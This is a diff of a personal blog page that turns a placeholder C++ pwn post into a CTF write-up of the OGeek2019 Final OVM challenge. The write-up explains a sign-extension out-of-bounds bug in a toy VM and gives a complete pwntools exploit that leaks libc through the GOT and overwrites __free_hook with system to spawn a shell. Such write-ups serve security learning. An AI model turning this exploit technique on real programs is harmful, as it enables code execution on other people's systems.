@@ -9,7 +9,7 @@
     
     <title>
         
-            c艹pwn学习 |
+            vmpwn合集 |
         
         Marce1&#39;s Blog
     </title>
@@ -260,7 +260,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        c艹pwn学习
+                        vmpwn合集
                     </div>
                 
 
@@ -286,12 +286,12 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2024-11-01 00:27:34</span>
+                <span class="datetime">2025-01-21 17:39:28</span>
             </span>
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Fri Nov 01 2024 00:36:31 GMT+0800">2024-11-01 00:36:31</span>
+                <span class="datetime" data-updated="Thu Jan 23 2025 23:03:16 GMT+0800">2025-01-23 23:03:16</span>
             </span>
         
 
@@ -302,7 +302,7 @@
                             <li class="category-item"><a href="/categories/pwn/">pwn</a></li>
                         
                     
-                            <li class="category-item">&nbsp;<i class="icon fas fa-angle-right"></i>&nbsp;<a href="/categories/pwn/c/">c++</a></li>
+                            <li class="category-item">&nbsp;<i class="icon fas fa-angle-right"></i>&nbsp;<a href="/categories/pwn/vm/">vm</a></li>
                         
                     
                 </ul>
@@ -316,10 +316,10 @@
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn/">pwn</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/c/">c++</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/to-do-list/">to_do_list</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/to-do-list/">to_do_list</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/vm/">vm</a></li>
                         
                     
                 </ul>
@@ -329,12 +329,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>48 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.4k 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>7 分钟</span>
             </span>
         
         
@@ -356,8 +356,48 @@
                     
 
                     
-                         <h1 id="C-pwn学习"><a href="#C-pwn学习" class="headerlink" title="C++pwn学习"></a>C++pwn学习</h1><p>​	不能再碌碌无为了！对于c++pwn真是一窍不通……比赛也只有保龄的份，在这里逐步更新c++pwn的学习。</p>
-<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.korey0sh1.fun/2023/10/20/C/#" >dig into C++ pwn - Hexo<i class="fas fa-external-link-alt"></i></a></p>
+                         <p>#vmpwn合集</p>
+<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p><img   src="/2024/11/01/c%E8%89%B9pwn%E5%AD%A6%E4%B9%A0/image-20250121174322385.png"  alt="image-20250121174322385"></p>
+<p>main函数，由用户指定pc和栈指针，解析用户输入的十六进制数作为指令和操作数，除了直接数外还可以选用4字节的寄存器作为参数。</p>
+<p><img   src="/2024/11/01/c%E8%89%B9pwn%E5%AD%A6%E4%B9%A0/image-20250121174720662.png"  alt="image-20250121174720662"></p>
+<p>最后会释放一个大小为0x8c的堆块，这个堆块的内容可以由我们写。想到了打free_hook</p>
+<p>具体的取指和运行：</p>
+<p><img   src="/2024/11/01/c%E8%89%B9pwn%E5%AD%A6%E4%B9%A0/image-20250121174852475.png"  alt="image-20250121174852475"></p>
+<p>由指定pc开始取指，读取memory中对应的指令一个一个执行。</p>
+<p><img   src="/2024/11/01/c%E8%89%B9pwn%E5%AD%A6%E4%B9%A0/image-20250121175135950.png"  alt="image-20250121175135950"></p>
+<p>看到ssize_t就觉得不对劲了，这东西是有符号的呀……</p>
+<p>如果寄存器变量内的有符号数为负数，那就能利用memory越界读写。看一下case 0x40对应的汇编代码验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000F24 ; 98:         memory[reg[hex1]] = reg[hex5];</span><br><span class="line">.text:0000000000000F24</span><br><span class="line">.text:0000000000000F24 loc_F24:                                ; CODE XREF: execute+93↑j</span><br><span class="line">.text:0000000000000F24                 movzx   edx, [rbp+hex1]</span><br><span class="line">.text:0000000000000F28                 lea     rax, reg</span><br><span class="line">.text:0000000000000F2F                 movsxd  rdx, edx</span><br><span class="line">.text:0000000000000F32                 mov     ecx, [rax+rdx*4] ;此时ecx代表reg[hex1]</span><br><span class="line">.text:0000000000000F35                 movzx   edx, [rbp+hex5]</span><br><span class="line">.text:0000000000000F39                 lea     rax, reg</span><br><span class="line">.text:0000000000000F40                 movsxd  rdx, edx</span><br><span class="line">.text:0000000000000F43                 mov     eax, [rax+rdx*4]</span><br><span class="line">.text:0000000000000F46 ; 97:         result = (ssize_t)memory;</span><br><span class="line">.text:0000000000000F46                 mov     esi, eax</span><br><span class="line">.text:0000000000000F48                 lea     rax, memory</span><br><span class="line">.text:0000000000000F4F                 movsxd  rdx, ecx ;如果reg[hex1]有符号，rdx也会进行符号扩展，在多出来的高位全部置1，导致我们可以将下标改成负数越界</span><br><span class="line">.text:0000000000000F52                 mov     [rax+rdx*4], esi</span><br><span class="line">.text:0000000000000F55                 jmp     loc_1205</span><br></pre></td></tr></table></figure>
+
+<p>movzx和movsxd分别代表零扩展和符号扩展，此事在csapp中亦有提及：</p>
+<p><img   src="/2024/11/01/c%E8%89%B9pwn%E5%AD%A6%E4%B9%A0/image-20250123190827651.png"  alt="image-20250123190827651"></p>
+<p>不仅是case 0x40的写，case 0x30的读也同样存在这个问题：</p>
+<p><img   src="/2024/11/01/c%E8%89%B9pwn%E5%AD%A6%E4%B9%A0/image-20250123191245673.png"  alt="image-20250123191245673"></p>
+<p>这么一来我们就可以先访问got表，将libc地址泄露之后越界写comment的地址为free_hook-8，在最后往comment上写&#x2F;bin&#x2F;sh\x00+p64(system)。</p>
+<p>首先，根据伪代码写一些可能要用到的函数，方便我们构造数据或者越界读写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">code_read</span>(<span class="params">reg, memory</span>):</span><br><span class="line">    code = reg&lt;&lt;<span class="number">16</span> | memory | <span class="number">0x30</span>&lt;&lt;<span class="number">24</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code_write</span>(<span class="params">reg, memory</span>):</span><br><span class="line">    code = reg&lt;&lt;<span class="number">16</span> | memory | <span class="number">0x40</span>&lt;&lt;<span class="number">24</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code_add</span>(<span class="params">reg5, reg1, reg3</span>):</span><br><span class="line">    code = reg5&lt;&lt;<span class="number">16</span> | reg1 | reg3&lt;&lt;<span class="number">8</span> | <span class="number">0x70</span>&lt;&lt;<span class="number">24</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code_left</span>(<span class="params">reg5, reg3, reg1</span>): <span class="comment">#reg5 = reg3&lt;&lt;reg1</span></span><br><span class="line">    code = reg5&lt;&lt;<span class="number">16</span> | reg3&lt;&lt;<span class="number">8</span> | reg1 | <span class="number">0xc0</span>&lt;&lt;<span class="number">24</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">reg5, a1</span>): <span class="comment">#reg5 = a1</span></span><br><span class="line">    code = reg5&lt;&lt;<span class="number">16</span> | a1 | <span class="number">0x10</span>&lt;&lt;<span class="number">24</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br></pre></td></tr></table></figure>
+
+<p>我们可以分别计算出需要覆盖的comment和需要泄露的stdin的got表相对memory的下标偏移，再算出相应的有符号数表示（偏移懒得截图，我直接上数据了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">offset_comment = <span class="number">0x30</span>/<span class="number">4</span> <span class="comment">#8 -8=0xfffffff8</span></span><br><span class="line">offset_stdin = <span class="number">0x303060</span>-<span class="number">0x301F80</span> <span class="comment">#0x38 -0x38 = 0xFFFFFFC8</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就可以开始构造了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#构造0xffffffc8</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;CODE: &quot;</span>) </span><br><span class="line">mov(<span class="number">0</span>, <span class="number">0xff</span>) <span class="comment">#r0 = 0xff</span></span><br><span class="line">mov(<span class="number">1</span>, <span class="number">8</span>) <span class="comment">#r1 = 8</span></span><br><span class="line">mov(<span class="number">2</span>, <span class="number">0xc8</span>) <span class="comment">#r2 = 0xc8</span></span><br><span class="line">code_left(<span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>) <span class="comment">#r3 = r0&lt;&lt;r1 = 0xff00</span></span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>) <span class="comment">#r3 = r3+r0 = 0xffff</span></span><br><span class="line">code_left(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>) <span class="comment">#r3 = r3&lt;&lt;r1 = 0xffff00</span></span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>) <span class="comment">#r3 = r3+r0 = 0xffffff</span></span><br><span class="line">code_left(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>) <span class="comment">#r3 = r3 &lt;&lt; r1 = 0xffffff00</span></span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>)<span class="comment">#reg[3] = 0xffffffc8</span></span><br></pre></td></tr></table></figure>
+
+<p>构造出-0x38后，我们将stdin的got表读进来，但是寄存器变量只有双字大小，got表的虚拟地址至少有7字节，我们需要分别读到两个寄存器中：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读stdingot表</span></span><br><span class="line">code_read(<span class="number">5</span>, <span class="number">3</span>) <span class="comment">#reg[5] = memory[reg[3]]</span></span><br><span class="line">mov(<span class="number">4</span>, <span class="number">1</span>) <span class="comment">#reg[4] = 1</span></span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>) <span class="comment">#reg[3] = reg[3] + reg[4]</span></span><br><span class="line">code_read(<span class="number">6</span>, <span class="number">3</span>) <span class="comment">#reg[6] = memory[reg[3]]</span></span><br><span class="line"><span class="comment">#reg[5]|reg[6]&lt;&lt;32 = stdin.got</span></span><br></pre></td></tr></table></figure>
+
+<p>然后打开gdb看一眼free_hook和stdin的偏移，0x1098，我们取0x1090，前八个字节写一个&#x2F;bin&#x2F;sh\x00，释放的时候好给参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#stdin 0x00007fc8dca78710 free_hook 0x7fc8dca797a8 0x1098</span></span><br><span class="line">mov(<span class="number">7</span>, <span class="number">0x10</span>) <span class="comment">#reg[7] = 0x10</span></span><br><span class="line">mov(<span class="number">8</span>, <span class="number">0x90</span>) <span class="comment">#reg[8] = 0x90</span></span><br><span class="line">code_left(<span class="number">7</span>, <span class="number">7</span>, <span class="number">1</span>) <span class="comment">#reg[7] = reg[7]&lt;&lt;reg[1] = 0x1000</span></span><br><span class="line">code_add(<span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>) <span class="comment">#reg[7] = reg[7]+reg[8] = 0x1090</span></span><br><span class="line">code_add(<span class="number">5</span>, <span class="number">5</span>, <span class="number">7</span>) <span class="comment">#reg[5] = reg[5]+reg[7] = stdin.got+free_hook_offset = &amp;__free_hook</span></span><br><span class="line"><span class="comment">#reg[5]|reg[6]&lt;&lt;32 = &amp;__free_hook</span></span><br></pre></td></tr></table></figure>
+
+<p>最后，往comment上写__free_hook地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov(<span class="number">9</span>, <span class="number">0x2f</span>) <span class="comment">#reg[9] = 0x2f</span></span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">9</span>) <span class="comment">#reg[3] = reg[3]+reg[9] = 0xfffffff8</span></span><br><span class="line">code_write(<span class="number">5</span>, <span class="number">3</span>) <span class="comment">#memory[reg[3]] = reg[5] </span></span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>) <span class="comment">#reg[3] = reg[3]+reg[4] = 0xffffff9</span></span><br><span class="line">code_write(<span class="number">6</span>, <span class="number">3</span>) <span class="comment">#memory[reg[3]] = reg[6]</span></span><br></pre></td></tr></table></figure>
+
+<p>万事俱备。在执行完代码后程序会把每个寄存器的内容打印出来，我们可以依次得到free_hook的真实地址，计算一下偏移很容易就能得到system地址，往free_hook上一写大功告成。</p>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.buuoj.cn&#x27;, 27277)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code_read</span>(<span class="params">reg, memory</span>):</span><br><span class="line">    code = reg&lt;&lt;<span class="number">16</span> | memory | <span class="number">0x30</span>&lt;&lt;<span class="number">24</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code_write</span>(<span class="params">reg, memory</span>):</span><br><span class="line">    code = reg&lt;&lt;<span class="number">16</span> | memory | <span class="number">0x40</span>&lt;&lt;<span class="number">24</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code_add</span>(<span class="params">reg5, reg1, reg3</span>):</span><br><span class="line">    code = reg5&lt;&lt;<span class="number">16</span> | reg1 | reg3&lt;&lt;<span class="number">8</span> | <span class="number">0x70</span>&lt;&lt;<span class="number">24</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code_left</span>(<span class="params">reg5, reg3, reg1</span>): <span class="comment">#reg5 = reg3&lt;&lt;reg1</span></span><br><span class="line">    code = reg5&lt;&lt;<span class="number">16</span> | reg3&lt;&lt;<span class="number">8</span> | reg1 | <span class="number">0xc0</span>&lt;&lt;<span class="number">24</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">reg5, a1</span>): <span class="comment">#reg5 = a1</span></span><br><span class="line">    code = reg5&lt;&lt;<span class="number">16</span> | a1 | <span class="number">0x10</span>&lt;&lt;<span class="number">24</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;PC: &quot;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;SP: &quot;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;CODE SIZE: &quot;</span>, <span class="string">b&#x27;23&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset_comment = <span class="number">0x30</span>/<span class="number">4</span> <span class="comment">#8 -8=0xfffffff8</span></span><br><span class="line">offset_stdin = <span class="number">0x303060</span>-<span class="number">0x301F80</span> <span class="comment">#0x38 -0x38 = 0xFFFFFFC8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造0xffffffc8</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;CODE: &quot;</span>)</span><br><span class="line">mov(<span class="number">0</span>, <span class="number">0xff</span>)</span><br><span class="line">mov(<span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">mov(<span class="number">2</span>, <span class="number">0xc8</span>)</span><br><span class="line">code_left(<span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">code_left(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">code_left(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>)<span class="comment">#reg[3] = 0xffffffc8</span></span><br><span class="line"><span class="comment">#读stdingot表</span></span><br><span class="line">code_read(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line">mov(<span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">code_read(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#stdin 0x00007fc8dca78710 free_hook 0x7fc8dca797a8 0x1098</span></span><br><span class="line">mov(<span class="number">7</span>, <span class="number">0x10</span>)</span><br><span class="line">mov(<span class="number">8</span>, <span class="number">0x90</span>)</span><br><span class="line">code_left(<span class="number">7</span>, <span class="number">7</span>, <span class="number">1</span>)</span><br><span class="line">code_add(<span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>)</span><br><span class="line">code_add(<span class="number">5</span>, <span class="number">5</span>, <span class="number">7</span>) <span class="comment">#reg[5]|reg[6]&lt;&lt;32 = &amp;__free_hook</span></span><br><span class="line"></span><br><span class="line">mov(<span class="number">9</span>, <span class="number">0x2f</span>)</span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">9</span>)</span><br><span class="line">code_write(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line">code_add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">code_write(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;R5: &#x27;</span>)</span><br><span class="line">r5 = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;R6: &#x27;</span>)</span><br><span class="line">r6 = <span class="built_in">int</span>(p.recv(<span class="number">4</span>), <span class="number">16</span>)</span><br><span class="line">free_hook = r5+(r6&lt;&lt;<span class="number">32</span>)+<span class="number">8</span></span><br><span class="line">success(<span class="string">&#x27;free_hook----&gt;&#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">libc_base = <span class="number">0x7f848c95c000</span>+free_hook-<span class="number">0x7f848cd217a8</span></span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/2024/11/01/c%E8%89%B9pwn%E5%AD%A6%E4%B9%A0/image-20250123225936556.png"  alt="image-20250123225936556"></p>
+<p>只在本地打通了，2.23的环境。buuoj没给libc附件，远程懒得去调了。</p>
 
                     
                 </div>
@@ -368,11 +408,11 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                c艹pwn学习
+                vmpwn合集
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
-                2024/11/01/c艹pwn学习/
+                2025/01/21/vmpwn合集/
             </div>
         </div>
 
@@ -388,7 +428,7 @@
                 <div class="type">
                     发布于
                 </div>
-                <div class="content">2024-11-01 00:27</div>
+                <div class="content">2025-01-21 17:39</div>
             </div>
 
 
@@ -428,11 +468,11 @@
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/c/">c++</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/to-do-list/">to_do_list</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/to-do-list/">to_do_list</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/vm/">vm</a>
                                     </li>
                                 
                             </ul>
@@ -471,31 +511,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2024/11/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%95%A5%E5%95%A5%E5%95%A5%E7%9A%84/"
-                                   title="操作系统啥啥啥的"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">操作系统啥啥啥的</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2024/10/31/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn4%E5%A4%8D%E7%8E%B0/"
-                                   title="网鼎杯pwn4复现"
+                                   href="/2024/12/30/%E4%BB%8E0-1%E5%BC%80%E5%A7%8B%E5%AE%9E%E7%8E%B0%E4%B8%90%E7%89%88pstree/"
+                                   title="从0.1开始实现丐版pstree"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">网鼎杯pwn4复现</span>
+                                        <span class="post-nav-title-item text-ellipsis">从0.1开始实现丐版pstree</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -523,7 +547,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#C-pwn%E5%AD%A6%E4%B9%A0"><span class="nav-text">C++pwn学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refer"><span class="nav-text">Refer</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#OGeek2019-Final-OVM"><span class="nav-text">[OGeek2019 Final]OVM</span></a></li></ol>
     </div>
 </div>
 
@@ -706,7 +730,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#C-pwn%E5%AD%A6%E4%B9%A0"><span class="nav-text">C++pwn学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refer"><span class="nav-text">Refer</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#OGeek2019-Final-OVM"><span class="nav-text">[OGeek2019 Final]OVM</span></a></li></ol>
     </div>
 </div>
 
